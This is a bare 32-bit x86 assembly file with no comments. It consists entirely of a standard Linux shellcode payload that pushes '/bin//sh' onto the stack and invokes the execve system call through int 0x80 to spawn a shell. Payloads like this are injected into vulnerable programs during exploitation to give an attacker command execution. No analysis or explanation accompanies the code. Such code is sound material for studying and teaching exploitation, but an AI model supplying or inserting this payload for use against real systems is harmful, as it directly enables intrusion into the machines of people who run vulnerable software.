BITS 32

section .text
global _start

_start:
    xor edx, edx
    xor ecx, ecx
    xor eax, eax
    push eax
    push   0x68732f2f
    push   0x6e69622f
    mov ebx, esp
    mov al, 0xb
    int 0x80
